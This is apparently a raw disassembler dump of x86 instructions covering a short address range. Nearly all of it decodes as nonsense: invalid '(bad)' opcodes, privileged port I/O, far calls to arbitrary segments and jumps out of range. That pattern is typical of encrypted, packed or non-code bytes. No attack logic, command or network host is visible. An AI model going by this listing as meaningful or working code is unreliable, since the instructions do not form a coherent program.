  40d6a1:	xchg   edx,eax
  40d6a2:	adc    dl,bh
  40d6a4:	push   es
  40d6a5:	push   ds
  40d6a6:	jp     0x40d695
  40d6a8:	or     edx,DWORD PTR [ebp-0x13]
  40d6ab:	into   
  40d6ac:	lods   eax,DWORD PTR ds:[esi]
  40d6ad:	xchg   edx,eax
  40d6ae:	pop    ss
  40d6af:	fdiv   QWORD PTR [eax-0x24e49906]
  40d6b5:	bound  ebx,QWORD PTR [ecx+0x5e]
  40d6b8:	ret    
  40d6b9:	inc    esp
  40d6ba:	add    al,0xb8
  40d6bc:	mov    ?,bp
  40d6bf:	lahf   
  40d6c0:	dec    edi
  40d6c1:	dec    esi
  40d6c2:	inc    ebx
  40d6c3:	hlt    
  40d6c4:	pop    es
  40d6c5:	into   
  40d6c6:	f2xm1  
  40d6c8:	out    0x68,al
  40d6ca:	mov    eax,ds:0xd8afd9ae
  40d6cf:	xor    esp,esp
  40d6d1:	xchg   ebx,eax
  40d6d2:	mov    DWORD PTR [ecx+edx*1],ebx
  40d6d5:	das    
  40d6d6:	mov    bh,0x88
  40d6d8:	out    0x15,eax
  40d6da:	les    ebp,FWORD PTR [edi-0x7299e90d]
  40d6e0:	jo     0x40d71e
  40d6e2:	mov    eax,0xfb1cb133
  40d6e7:	inc    eax
  40d6e8:	fidiv  DWORD PTR ds:0x908c6ced
  40d6ee:	mov    es,WORD PTR [ebx]
  40d6f0:	lods   al,BYTE PTR ds:[esi]
  40d6f1:	sbb    DWORD PTR [edx-0x65365798],esp
  40d6f7:	loopne 0x40d6e8
  40d6f9:	mov    esp,0xda693c7
  40d6fe:	push   edi
  40d6ff:	fcmovbe st,st(4)
  40d701:	mov    ah,0x42
  40d703:	adc    edi,DWORD PTR [edi]
  40d705:	sar    DWORD PTR [eax+0x29],cl
  40d708:	pop    edi
  40d709:	neg    bh
  40d70b:	popa   
  40d70c:	js     0x40d6a3
  40d70e:	imul   edi,DWORD PTR [ecx+ecx*2],0x6563e0d5
  40d715:	and    DWORD PTR [ebx-0x6ad21ab4],edx
  40d71b:	push   es
  40d71c:	push   esp
  40d71d:	sahf   
  40d71e:	call   0xcd2e:0x6e85bf83
  40d725:	mov    bl,0x4d
  40d727:	and    DWORD PTR [ecx-0x67e8d4d9],esp
  40d72d:	mov    eax,0x90ddf878
  40d732:	sbb    eax,0x32933672
  40d737:	adc    BYTE PTR [edx],bh
  40d739:	jno    0x40d6e6
  40d73b:	mov    al,ds:0x188a7baf
  40d740:	addr16 xchg edx,eax
  40d742:	hlt    
  40d743:	xor    al,0x83
  40d745:	jb     0x40d715
  40d747:	(bad)
  40d74a:	jge    0x40d7aa
  40d74c:	aam    0x19
  40d74e:	sub    al,0x20
  40d750:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d751:	fs in  al,0xb0
  40d754:	daa    
  40d755:	xor    ebp,DWORD PTR [ebx-0xa]
  40d758:	popa   
  40d759:	inc    esp
  40d75a:	mov    ebp,DWORD PTR [eax]
  40d75c:	sub    esi,DWORD PTR cs:[ecx+0x49347d8]
  40d763:	xchg   esi,eax
  40d764:	mov    ah,0x15
  40d766:	or     eax,0x1929b080
  40d76b:	cmp    ebx,DWORD PTR [ecx+0x75c3b830]
  40d771:	sbb    BYTE PTR [esi],dh
  40d773:	loope  0x40d796
  40d775:	pop    DWORD PTR [edx-0x13]
  40d778:	adc    al,0x76
  40d77a:	repnz adc DWORD PTR [ebx+0x67],ebx
  40d77e:	jne    0x40d7c1
  40d780:	(bad)  
  40d782:	and    edi,DWORD PTR [ecx-0x6c36dea1]
  40d788:	neg    DWORD PTR [eax+0x2a]
  40d78b:	pop    edx
  40d78c:	stos   BYTE PTR es:[edi],al
  40d78d:	lea    edi,[ebx-0x48e84a45]
  40d793:	mov    eax,ds:0x8f261775
  40d798:	add    edi,eax
  40d79a:	imul   edi,DWORD PTR [esi-0x2e],0x74
  40d79e:	imul   ecx,DWORD PTR [esi+0x37],0x1a3a52e5
  40d7a5:	div    esi
  40d7a7:	ins    DWORD PTR es:[edi],dx
  40d7a8:	outs   dx,BYTE PTR ds:[esi]
  40d7a9:	push   esp
  40d7aa:	push   ecx
  40d7ab:	mov    dl,0x10
  40d7ad:	adc    dh,0x14
  40d7b0:	xlat   BYTE PTR ds:[ebx]
  40d7b1:	jb     0x40d78b
  40d7b3:	push   ebx
  40d7b4:	fimul  WORD PTR [esi+0xb04f681]
  40d7ba:	and    BYTE PTR [esi+0x26],dh
  40d7bd:	inc    edi
  40d7be:	hlt    
  40d7bf:	mov    dh,0xda
  40d7c1:	inc    ebp
  40d7c2:	push   cs
  40d7c3:	mov    BYTE PTR [ebp-0xe21f24f],dl
  40d7c9:	jnp    0x40d838
  40d7cb:	sbb    BYTE PTR [ebx-0x72],ah
  40d7ce:	and    BYTE PTR [ecx+0x3c],dh
  40d7d1:	stc    
  40d7d2:	push   eax
  40d7d3:	jne    0x40d7f0
  40d7d5:	repz cmp ecx,ebp
  40d7d8:	pusha  
  40d7d9:	ins    BYTE PTR es:[edi],dx
  40d7da:	hlt    
  40d7db:	sub    al,0xeb
  40d7dd:	cmp    esp,DWORD PTR fs:[esi-0x5beebb7c]
  40d7e4:	pop    ds
  40d7e5:	pop    edi
  40d7e6:	and    ah,BYTE PTR [ecx-0x79]
  40d7e9:	push   ecx
  40d7ea:	dec    bp
  40d7ec:	mov    edx,0xce410994
  40d7f1:	sub    BYTE PTR [edx-0x7e15c660],bl
  40d7f7:	sub    eax,0xfb959d30
  40d7fc:	lods   al,BYTE PTR ds:[esi]
  40d7fd:	or     BYTE PTR [esi-0x69874c2c],ah
  40d803:	cli    
  40d804:	cwde   
  40d805:	fnstcw WORD PTR [esi-0x68de73e2]
  40d80b:	xchg   ebx,eax
  40d80c:	xchg   esi,eax
  40d80d:	pushf  
  40d80e:	mov    DWORD PTR [eax+eax*8+0x3a2c377a],esp
  40d815:	inc    edx
  40d816:	in     al,dx
  40d817:	cmp    bh,BYTE PTR [ebp+0x34]
  40d81a:	pop    esp
  40d81b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d81c:	ins    DWORD PTR es:[edi],dx
  40d81d:	in     eax,0x93
  40d81f:	xchg   bl,dh
  40d821:	fbstp  TBYTE PTR [esi]
  40d823:	or     dl,dl
  40d825:	inc    esi
  40d826:	and    ah,BYTE PTR [edx+eiz*4-0x6f]
  40d82a:	push   edi
  40d82b:	mov    WORD PTR [ecx-0x54ee91f7],?
  40d831:	cmp    eax,edx
  40d833:	or     eax,0x44290c95
  40d838:	mov    edx,0x56504d47
  40d83d:	in     al,0x7c
  40d83f:	inc    edx
  40d840:	out    dx,al
  40d841:	xchg   ebp,eax
  40d842:	jg     0x40d7cd
  40d844:	push   edx
  40d845:	or     al,BYTE PTR [edi-0x1fe91b7d]
  40d84b:	test   BYTE PTR [edx],cl
  40d84d:	cmp    ah,BYTE PTR [edx]
  40d84f:	sahf   
  40d850:	not    BYTE PTR [ebx-0x62aecd03]
  40d856:	pop    ds
  40d857:	(bad)  
  40d858:	sub    al,BYTE PTR [ebx+0x69]
  40d85b:	mov    esp,0xf389e01b
  40d860:	mov    al,ds:0xbef4ca52
  40d865:	sbb    bl,bh
  40d867:	or     ah,BYTE PTR [eax+0x9]
  40d86a:	pop    ds
  40d86b:	push   cs
  40d86c:	dec    ebp
  40d86d:	cmp    eax,0x1462ed2f
  40d872:	lds    ecx,FWORD PTR ds:0xd7e14f2d
  40d878:	adc    al,0xd6
  40d87a:	push   es
  40d87b:	mov    al,BYTE PTR [esi]
  40d87d:	mov    dl,BYTE PTR [ebx]
  40d87f:	pop    ds
  40d880:	data16 fbstp TBYTE PTR [esi]
  40d883:	dec    ebx
  40d884:	mov    cl,0x92
  40d886:	xchg   esi,eax
  40d887:	icebp  
  40d888:	mov    al,ds:0xd03c95c4
  40d88d:	mov    bl,dl
  40d88f:	lods   eax,DWORD PTR ds:[esi]
  40d890:	sub    ebx,DWORD PTR [ecx-0x44]
  40d893:	clc    
  40d894:	add    ch,bl
  40d896:	icebp  
  40d897:	mov    esp,ecx
  40d899:	jnp    0x40d90b
  40d89b:	inc    DWORD PTR [edx]
  40d89d:	mov    ebp,0x44c46754
  40d8a2:	cmp    ch,0xea
  40d8a5:	or     edi,edi
  40d8a7:	and    DWORD PTR [edi+0x20],eax
  40d8aa:	leave  
  40d8ab:	out    dx,al
  40d8ac:	add    bh,dl
  40d8ae:	ret    0xb3af
  40d8b1:	lods   eax,DWORD PTR ds:[esi]
  40d8b2:	adc    al,0xec
  40d8b4:	xchg   DWORD PTR [edx+0x72],esp
  40d8b7:	or     esp,DWORD PTR [ecx+eiz*2]
  40d8ba:	mov    ebx,0x8ba3d6e7
  40d8bf:	out    dx,eax
  40d8c0:	(bad)  
  40d8c1:	mov    ebp,0xb1db93fa
  40d8c6:	xor    ebx,DWORD PTR [eax+0x2c]
  40d8c9:	xor    BYTE PTR [ebx+eax*8],al
  40d8cc:	push   edi
  40d8cd:	out    dx,eax
  40d8ce:	sub    bl,BYTE PTR [ebx+ecx*1+0x3a1be34b]
  40d8d5:	pop    ecx
  40d8d6:	jo     0x40d94b
  40d8d8:	clc    
  40d8d9:	lods   eax,DWORD PTR ds:[esi]
  40d8da:	fs xchg edi,eax
  40d8dc:	je     0x40d944
  40d8de:	jo     0x40d922
  40d8e0:	jge    0x40d937
  40d8e2:	adc    DWORD PTR [ecx+0x70],0xefaec2ad
  40d8e9:	jmp    0x40d95d
  40d8eb:	mov    cl,0x87
  40d8ed:	adc    eax,0x4a17bb7
  40d8f2:	xor    ebx,DWORD PTR [ecx+0x44]
  40d8f5:	mov    bl,0x59
  40d8f7:	dec    esp
  40d8f8:	repz sub eax,0x293cd9cf
  40d8fe:	rcr    DWORD PTR [edx-0xcee8bf],0xea
  40d905:	or     BYTE PTR ss:[eax+eiz*4],0x38
  40d90a:	mov    dl,0x13
  40d90c:	fidiv  WORD PTR [ecx+0x7d]
  40d90f:	adc    al,BYTE PTR [edi+edx*2+0x644afbb5]
  40d916:	push   ebp
  40d917:	push   cs
  40d918:	ins    BYTE PTR es:[edi],dx
  40d919:	xor    ebx,esp
  40d91b:	jmp    0x40d994
  40d91d:	push   eax
  40d91e:	inc    eax
  40d91f:	fwait
  40d920:	aad    0x29
  40d922:	outs   dx,BYTE PTR ds:[esi]
  40d923:	dec    eax
  40d924:	inc    esi
  40d925:	xchg   BYTE PTR [eax-0x26],dl
  40d928:	cmp    eax,0xef4b4f37
  40d92d:	mov    ebp,0x7b036447
  40d932:	cmp    al,0x37
  40d934:	sbb    BYTE PTR [esi+0x959e99c],0x49
  40d93b:	daa    
  40d93c:	mov    al,0xc5
  40d93e:	in     eax,dx
  40d93f:	idiv   DWORD PTR es:[eax-0x67f660e0]
  40d946:	sahf   
  40d947:	mov    ah,0xee
  40d949:	sub    eax,0x2b096a53
  40d94e:	into   
  40d94f:	jmp    0x2ef:0xff2bf2dc
  40d956:	add    eax,0x30de9111
  40d95b:	aaa    
  40d95c:	and    eax,0xcee1ccd3
  40d961:	jmp    0xd37f51bf
  40d966:	jns    0x40d96b
  40d968:	cmp    al,bl
  40d96a:	daa    
  40d96b:	mov    cl,0x87
  40d96d:	pop    ebx
  40d96e:	std    
  40d96f:	(bad)  
  40d970:	fisub  WORD PTR [ecx]
  40d972:	mov    cl,0xaf
  40d974:	mov    al,ds:0x7794df55
  40d979:	jp     0x40d9c0
  40d97b:	push   cs
  40d97c:	dec    esi
  40d97d:	add    eax,ecx
  40d97f:	fadd   st,st(5)
  40d981:	jg     0x40d9c1
  40d983:	xor    al,0x5b
  40d985:	outs   dx,DWORD PTR ds:[esi]
  40d986:	jo     0x40d926
  40d988:	xchg   DWORD PTR [eax+0x2ffc503b],ebx
  40d98e:	dec    ecx
  40d98f:	call   0x67b0:0xa9762f3a
  40d996:	pop    eax
  40d997:	stc    
  40d998:	push   es
  40d999:	pop    edx
  40d99a:	push   ecx
  40d99b:	test   eax,0x8c368bee
  40d9a0:	(bad)  
  40d9a2:	lock pushf 
  40d9a4:	loopne 0x40d93c
  40d9a6:	jp     0x40d9ac
  40d9a8:	(bad)  
  40d9a9:	shl    DWORD PTR [edi-0x55],cl
  40d9ac:	mov    bh,BYTE PTR [edx+0x63079b0b]
  40d9b2:	std    
  40d9b3:	xchg   edi,eax
  40d9b4:	jo     0x40da0b
  40d9b6:	arpl   WORD PTR [ebx+0x585dc38e],si
  40d9bc:	push   ecx
  40d9bd:	and    eax,0xbe78aed0
  40d9c2:	xchg   edi,eax
  40d9c3:	in     al,dx
  40d9c4:	adc    BYTE PTR [eax],al
  40d9c6:	jmp    DWORD PTR [ecx]
  40d9c8:	lods   al,BYTE PTR ds:[esi]
  40d9c9:	pop    es
  40d9ca:	fldenv [edi+0x5c]
  40d9cd:	sbb    ah,ah
  40d9cf:	add    DWORD PTR [eax-0x61bf0d8d],ecx
  40d9d5:	sub    eax,0x7071ea0
  40d9da:	dec    eax
  40d9db:	adc    ebx,DWORD PTR [edx-0x5e4812bc]
  40d9e1:	into   
  40d9e2:	fs inc eax
  40d9e4:	sub    eax,0x1df2eb25
  40d9e9:	cmp    DWORD PTR [ecx-0x5ebe1158],esi
  40d9ef:	dec    ebp
  40d9f0:	clc    
  40d9f1:	cdq    
  40d9f2:	push   ecx
  40d9f3:	jl     0x40d9e9
  40d9f5:	rol    ebx,0xce
  40d9f8:	xor    BYTE PTR [ebx-0x6326b6c9],dh
  40d9fe:	arpl   cx,sp
  40da00:	adc    dl,ah
  40da02:	test   al,dh
  40da04:	(bad)  ds:0x4df00d68
  40da0a:	ret    0xb92c
  40da0d:	sti    
  40da0e:	pop    esp
  40da0f:	mov    WORD PTR [eax-0x76f3b98],ds
  40da15:	push   esp
  40da16:	retf   0x289a
  40da19:	and    esp,edx
  40da1b:	dec    edi
  40da1c:	cwde   
  40da1d:	daa    
  40da1e:	add    eax,0x21e146b6
  40da23:	cwde   
  40da24:	test   DWORD PTR [ecx],ecx
  40da26:	pop    edi
  40da27:	mov    edx,0xf1b87860
  40da2c:	pop    ds
  40da2d:	icebp  
  40da2e:	(bad)  
  40da2f:	jge    0x40da16
  40da31:	jp     0x40d9c1
  40da33:	mov    edi,DWORD PTR [edx*2+0x7d9d604c]
  40da3a:	lods   eax,DWORD PTR ds:[esi]
  40da3b:	dec    ebp
  40da3c:	cmp    eax,0x272850d3
  40da41:	xchg   edx,eax
  40da42:	test   BYTE PTR [edi],ah
  40da44:	jecxz  0x40d9ee
  40da46:	aam    0xff
  40da48:	shr    DWORD PTR [esi-0x33bcc992],1
  40da4e:	sub    DWORD PTR [esi-0x10391e27],eax
  40da54:	jns    0x40dac3
  40da56:	and    al,0xd7
  40da58:	lahf   
  40da59:	xchg   edx,eax
  40da5a:	dec    ebp
  40da5b:	push   esp
  40da5c:	out    0x3c,al
  40da5e:	push   ebx
  40da5f:	test   eax,0x80f4a47b
  40da64:	das    
  40da65:	cld    
  40da66:	stos   DWORD PTR es:[edi],eax
  40da67:	dec    eax
  40da68:	call   0x1948152a
  40da6d:	mov    ecx,0xb3316648
  40da72:	add    eax,0xa4e252ca
  40da77:	sbb    al,BYTE PTR [ecx-0x6c]
  40da7a:	xor    ch,bl
  40da7c:	mov    dl,BYTE PTR [edx]
  40da7e:	rcl    BYTE PTR [edi-0x80],1
  40da81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da82:	popa   
  40da83:	and    eax,DWORD PTR [eax-0x49]
  40da86:	mov    esi,0xdda97223
  40da8b:	jmp    0x40da3e
  40da8d:	sbb    al,0x33
  40da8f:	push   ebp
  40da90:	inc    BYTE PTR [esp+esi*2-0x8]
  40da94:	pop    esp
  40da95:	clc    
  40da96:	inc    esp
  40da97:	xlat   BYTE PTR ds:[ebx]
  40da98:	test   cl,al
  40da9a:	sbb    al,0xbf
  40da9c:	and    eax,0xc90552e4
  40daa1:	mov    es,WORD PTR [ebp-0x78]
  40daa4:	dec    ebp
  40daa5:	push   ecx
  40daa6:	xchg   esp,eax
  40daa7:	sub    cl,BYTE PTR [edx-0x76198dc3]
  40daad:	lods   eax,DWORD PTR ds:[esi]
  40daae:	adc    ah,0xef
  40dab1:	lds    ebp,FWORD PTR ds:0xe77230d3
  40dab7:	loop   0x40dad6
  40dab9:	imul   esp,DWORD PTR [ebp+0x36],0xfffffff0
  40dabd:	inc    ebx
  40dabe:	adc    ecx,0x9b0ebb71
  40dac4:	popa   
  40dac5:	sub    edx,0xefbab46e
  40dacb:	lods   eax,DWORD PTR ds:[esi]
  40dacc:	(bad)  
  40dacd:	adc    bl,BYTE PTR [eax*4-0x2c1ea5f4]
  40dad4:	add    DWORD PTR [edi],esi
  40dad6:	imul   ecx,DWORD PTR [esi+0x65b615a0],0x2d
  40dadd:	out    0xbe,eax
  40dadf:	into   
  40dae0:	ret    
  40dae1:	mov    edi,0x171c913c
  40dae6:	mov    al,0xf9
  40dae8:	fwait
  40dae9:	iret   
  40daea:	mov    edx,0x21b3e07e
  40daef:	rdseed eax
  40daf2:	mov    ch,0x2d
  40daf4:	xchg   ebx,eax
  40daf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40daf6:	mov    dl,0xd9
  40daf8:	sti    
  40daf9:	daa    
  40dafa:	int    0x56
  40dafc:	dec    DWORD PTR [esi+0x14]
  40daff:	(bad)  
  40db00:	ficom  WORD PTR [ebp+0x284033c9]
  40db06:	jge    0x40db06
  40db08:	mov    eax,ds:0xe09e7a69
  40db0d:	sbb    BYTE PTR [edx-0x11],bh
  40db10:	or     BYTE PTR [edi-0x101e5cec],cl
  40db16:	daa    
  40db17:	fstp   DWORD PTR fs:[edi-0x1]
  40db1b:	outs   dx,DWORD PTR ds:[esi]
  40db1c:	out    dx,al
  40db1d:	retf   
  40db1e:	sbb    bh,BYTE PTR [edx-0x21]
  40db21:	loope  0x40db35
  40db23:	and    al,0x80
  40db25:	enter  0xd2cc,0xd4
  40db29:	mov    dl,0x9
  40db2b:	jb     0x40db8d
  40db2d:	retf   
  40db2e:	mov    esp,0x2ac3cda5
  40db33:	in     al,0xac
  40db35:	outs   dx,DWORD PTR ds:[esi]
  40db36:	jmp    0x40dac5
  40db38:	dec    esp
  40db39:	das    
  40db3a:	fwait
  40db3b:	mov    esi,0xf19f00a0
  40db40:	loopne 0x40dbbf
  40db42:	aam    0xb1
  40db44:	mov    DWORD PTR [eax+0x3],eax
  40db47:	lds    ecx,FWORD PTR [ebp+0x11]
  40db4a:	mov    cl,cl
  40db4c:	push   ebx
  40db4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db4e:	int    0x18
  40db50:	popw   ds
  40db52:	pop    ss
  40db53:	mov    WORD PTR [edx-0x30],fs
  40db56:	pop    ds
  40db57:	push   cs
  40db58:	jle    0x40dada
  40db5a:	jno    0x40db1c
  40db5c:	shl    bl,cl
  40db5e:	cwde   
  40db5f:	je     0x40dae5
  40db61:	jmp    0xefc18adf
  40db66:	call   0x3978396a
  40db6b:	xchg   ebx,eax
  40db6c:	add    BYTE PTR [ebp+0x5c954ed9],bh
  40db72:	inc    edi
  40db73:	xchg   esi,eax
  40db74:	out    0xbf,eax
  40db76:	cmp    al,0x27
  40db78:	stos   BYTE PTR es:[edi],al
  40db79:	jb     0x40dbc7
  40db7b:	add    BYTE PTR [ebx],0xdf
  40db7e:	mov    cl,0x35
  40db80:	call   0x62a1:0x234e0324
  40db87:	ins    DWORD PTR es:[edi],dx
  40db88:	test   eax,0x3ed67936
  40db8d:	test   DWORD PTR [eax],0xedf13f48
  40db93:	aas    
  40db94:	mov    eax,ds:0x334cbc49
  40db99:	and    edi,ecx
  40db9b:	dec    ecx
  40db9c:	adc    al,0x18
  40db9e:	bound  esi,QWORD PTR [eax+eax*8]
  40dba1:	test   eax,0x2c0bc7bb
  40dba6:	dec    esi
  40dba7:	and    cl,BYTE PTR [edx-0x1f]
  40dbaa:	fwait
  40dbab:	mov    bh,BYTE PTR [esi+0x2]
  40dbae:	mov    ch,0x40
  40dbb0:	and    al,0x90
  40dbb2:	push   ss
  40dbb3:	hlt    
  40dbb4:	test   DWORD PTR [edi],ebp
  40dbb6:	and    BYTE PTR [ebp-0x4d179dd],al
  40dbbc:	sbb    DWORD PTR [esi],esp
  40dbbe:	adc    BYTE PTR [edx-0x5e4badd2],0x12
  40dbc5:	shr    DWORD PTR [esi-0x23615594],cl
  40dbcb:	add    al,0xd
  40dbcd:	mov    dl,0xaf
  40dbcf:	lods   al,BYTE PTR ds:[esi]
  40dbd0:	repz pop edi
  40dbd2:	pop    ebx
  40dbd3:	add    eax,0x3346a31f
  40dbd8:	mov    dl,0x82
  40dbda:	mov    ch,0x7a
  40dbdc:	xor    eax,0x9f9f27e
  40dbe1:	or     DWORD PTR [edi+ecx*1+0x57],esi
  40dbe5:	shr    DWORD PTR [eax],cl
  40dbe7:	fsqrt  
  40dbe9:	add    eax,0xb63b5cf3
  40dbee:	scas   al,BYTE PTR es:[edi]
  40dbef:	out    dx,eax
  40dbf0:	cmp    DWORD PTR [esi-0x5fc893ee],eax
  40dbf6:	imul   esp,ebp,0xffffff98
  40dbf9:	std    
  40dbfa:	jle    0x40dc20
  40dbfc:	lods   al,BYTE PTR ds:[esi]
  40dbfd:	scas   eax,DWORD PTR es:[edi]
  40dbfe:	dec    esi
  40dbff:	xchg   edi,eax
  40dc00:	sbb    al,0xed
  40dc02:	jns    0x40dbbc
  40dc04:	adc    al,0x1e
  40dc06:	adc    eax,0xd2394229
  40dc0b:	jb     0x40dbb6
  40dc0d:	sti    
  40dc0e:	leave  
  40dc0f:	cmc    
  40dc10:	fcmove st,st(2)
  40dc12:	stc    
  40dc13:	icebp  
  40dc14:	mov    edx,0x3465986c
  40dc19:	jns    0x40dc8e
  40dc1b:	inc    edi
  40dc1c:	push   0xecac91e4
  40dc21:	xor    dh,BYTE PTR [ecx]
  40dc23:	and    al,dl
  40dc25:	addr16 out 0xce,eax
  40dc28:	cmp    ch,BYTE PTR [edx]
  40dc2a:	(bad)  
  40dc2b:	fldpi  
  40dc2d:	mov    ebx,0x3069aeff
  40dc32:	dec    esi
  40dc33:	jbe    0x40dbe0
  40dc35:	cli    
  40dc36:	fld    DWORD PTR [eax-0x2ebbadb]
  40dc3c:	xchg   ecx,eax
  40dc3d:	dec    esi
  40dc3e:	xchg   esp,eax
  40dc3f:	xchg   ecx,eax
  40dc40:	add    eax,0x321c1123
  40dc45:	lods   al,BYTE PTR ds:[esi]
  40dc46:	je     0x45ce8c5c
  40dc4c:	sbb    BYTE PTR [ebp+0x68a35d48],ah
  40dc52:	retf   
  40dc53:	fdiv   st,st(3)
  40dc55:	dec    ebp
  40dc56:	mov    al,ds:0x3da75d6a
  40dc5b:	ins    BYTE PTR es:[edi],dx
  40dc5c:	inc    eax
  40dc5d:	xchg   esi,eax
  40dc5e:	ins    DWORD PTR es:[edi],dx
  40dc5f:	jle    0x40dbea
  40dc61:	test   BYTE PTR [edi-0x64],bh
  40dc64:	adc    al,0x27
  40dc67:	aaa    
  40dc68:	xchg   edi,eax
  40dc69:	xor    al,0x4e
  40dc6b:	jnp    0x40dbf1
  40dc6d:	push   es
  40dc6e:	xlat   BYTE PTR ds:[ebx]
  40dc6f:	leave  
  40dc70:	inc    eax
  40dc71:	mov    ds:0x88489aa7,al
  40dc76:	js     0x40dc8a
  40dc78:	(bad)  
  40dc79:	sbb    bh,cl
  40dc7b:	loopne 0x40dced
  40dc7d:	sbb    al,0x60
  40dc7f:	retf   0xe136
  40dc82:	mov    DWORD PTR [ebx],0xcbaff51e
  40dc88:	neg    ch
  40dc8a:	add    bh,al
  40dc8c:	lock retf 
  40dc8e:	pop    ebx
  40dc8f:	(bad)  
  40dc90:	dec    ebx
  40dc91:	pop    edx
  40dc92:	and    BYTE PTR [ecx-0x1602df3b],0x93
  40dc99:	xor    eax,0xe2d3f2a3
  40dc9e:	xchg   esp,eax
  40dc9f:	xchg   BYTE PTR [eax-0x63],al
  40dca2:	stc    
  40dca3:	pop    ds
  40dca4:	in     al,dx
  40dca5:	pop    ss
  40dca6:	dec    edi
  40dca7:	mov    edi,0x49abe2d3
  40dcac:	push   edx
  40dcad:	mov    edx,0xa279a4d5
  40dcb2:	sahf   
  40dcb3:	cmp    BYTE PTR [esi-0x4d],0x1e
  40dcb7:	fwait
  40dcb8:	sti    
  40dcb9:	sub    al,0x9d
  40dcbb:	jne    0x40dd0b
  40dcbd:	into   
  40dcbe:	and    BYTE PTR [edi-0x395bdf3f],ch
  40dcc4:	cmp    BYTE PTR [edx+eiz*1-0x1c1f85da],cl
  40dccb:	inc    ecx
  40dccc:	ret    
  40dccd:	js     0x40dc85
  40dccf:	into   
  40dcd0:	or     ebx,ebp
  40dcd2:	cmp    esp,edx
  40dcd4:	pop    edi
  40dcd5:	idiv   BYTE PTR [edx]
  40dcd7:	add    al,BYTE PTR [edi+0x7]
  40dcda:	xor    ecx,DWORD PTR [ecx-0x4f]
  40dcdd:	nop
  40dcde:	stc    
  40dcdf:	push   ds
  40dce0:	xor    cl,dh
  40dce2:	inc    edi
  40dce3:	lds    esi,FWORD PTR [edx+0x4f635262]
  40dce9:	test   al,0x6b
  40dceb:	aam    0xa6
  40dced:	inc    ebp
  40dcee:	sub    DWORD PTR [edi+0x6d],0xf3e018ef
  40dcf5:	scas   al,BYTE PTR es:[edi]
  40dcf6:	ja     0x40dd06
  40dcf8:	dec    edi
  40dcf9:	sbb    DWORD PTR [eax+esi*1-0x447d9927],eax
  40dd00:	add    al,0x42
  40dd02:	pop    ebp
  40dd03:	xchg   ebx,eax
  40dd04:	js     0x40dd80
  40dd06:	push   ds
  40dd07:	test   eax,0xaf3b5d02
  40dd0c:	(bad)  
  40dd0d:	pop    eax
  40dd0e:	pop    edx
  40dd0f:	xchg   esp,eax
  40dd10:	ret    0xd44a
  40dd13:	pop    es
  40dd14:	aas    
  40dd15:	push   ebx
  40dd16:	mov    ds,WORD PTR [esi-0x4]
  40dd19:	jecxz  0x40dcae
  40dd1b:	test   DWORD PTR [ebx+0x54],edi
  40dd1e:	inc    esi
  40dd1f:	daa    
  40dd20:	xor    DWORD PTR [esi+0x51c6736e],edi
  40dd26:	pop    eax
  40dd27:	lods   al,BYTE PTR ds:[esi]
  40dd28:	fwait
  40dd29:	add    BYTE PTR [ebp+0x187ff06e],ch
  40dd2f:	xchg   BYTE PTR [esi+0x2a],ah
  40dd32:	or     edx,DWORD PTR [edx]
  40dd34:	jbe    0x40dd2b
  40dd36:	sbb    ebp,DWORD PTR [edi]
  40dd38:	mov    BYTE PTR [esi+ebp*2],bh
  40dd3b:	add    DWORD PTR [esi+0x56],ebp
  40dd3e:	outs   dx,DWORD PTR ds:[esi]
  40dd3f:	ror    BYTE PTR [ecx+0x5b],1
  40dd42:	ins    DWORD PTR es:[edi],dx
  40dd43:	out    dx,eax
  40dd44:	mov    al,0x54
  40dd46:	or     al,0xbe
  40dd48:	push   0xd43f49f4
  40dd4d:	inc    ebp
  40dd4e:	mov    eax,0x39afb927
  40dd53:	and    al,BYTE PTR [ecx]
  40dd55:	inc    edx
  40dd56:	add    ah,ah
  40dd58:	popa   
  40dd59:	push   esi
  40dd5a:	into   
  40dd5b:	xor    ebx,esi
  40dd5d:	scas   al,BYTE PTR es:[edi]
  40dd5e:	mov    eax,ds:0x705113ae
  40dd63:	mov    dl,0x10
  40dd65:	sbb    BYTE PTR [ebx+0x5c19276e],bl
  40dd6b:	xchg   ebp,eax
  40dd6c:	in     al,dx
  40dd6d:	loopne 0x40dddc
  40dd6f:	into   
  40dd70:	mov    ds:0x33d94123,eax
  40dd75:	sbb    BYTE PTR [ecx+ebp*2-0x1d4cc2eb],bh
  40dd7c:	mov    ah,0x9
  40dd7e:	inc    DWORD PTR [esi+0x3041e59c]
  40dd84:	sub    BYTE PTR [edi],cl
  40dd86:	jecxz  0x40dddb
  40dd88:	mov    ah,0x5b
  40dd8a:	xor    eax,0x1dce45e
  40dd8f:	xor    bl,bl
  40dd91:	mov    dh,0x81
  40dd93:	retf   0xbab4
  40dd96:	add    edi,DWORD PTR [esi+0x7e]
  40dd99:	adc    ah,cl
  40dd9b:	(bad)  
  40dd9c:	xchg   edx,eax
  40dd9d:	in     al,dx
  40dd9e:	mov    DWORD PTR [ecx+0x2bba8c50],edi
  40dda4:	fstp   QWORD PTR [esi-0x7a87ce75]
  40ddaa:	ja     0x40de0d
  40ddac:	sbb    edx,edi
  40ddae:	(bad)  
  40ddaf:	sti    
  40ddb0:	fwait
  40ddb1:	jo     0x40de19
  40ddb3:	int    0xba
  40ddb5:	ror    ah,cl
  40ddb7:	cld    
  40ddb8:	lods   eax,DWORD PTR ds:[esi]
  40ddb9:	xor    al,0xeb
  40ddbb:	lahf   
  40ddbc:	jmp    0x56d2:0xd35232a7
  40ddc3:	and    ebx,edx
  40ddc5:	cmp    BYTE PTR [ebx],bh
  40ddc7:	dec    ebx
  40ddc8:	aaa    
  40ddc9:	sbb    edx,0x3f
  40ddcc:	cdq    
  40ddcd:	add    al,0xa7
  40ddcf:	ds scas al,BYTE PTR es:[edi]
  40ddd1:	cmp    DWORD PTR [esi],edi
  40ddd3:	adc    eax,0x4de29714
  40ddd8:	or     DWORD PTR [edx],esp
  40ddda:	bound  edx,QWORD PTR [ebx-0x39871d82]
  40dde0:	xor    eax,0x6eb2b008
  40dde5:	push   ds
  40dde6:	outs   dx,DWORD PTR ds:[esi]
  40dde7:	inc    ebp
  40dde8:	jnp    0x40dd87
  40ddea:	push   ds
  40ddeb:	pop    esp
  40ddec:	pop    ss
  40dded:	jmp    0xf994:0x68f32c23
  40ddf4:	ds rcr eax,cl
  40ddf7:	sbb    al,0x75
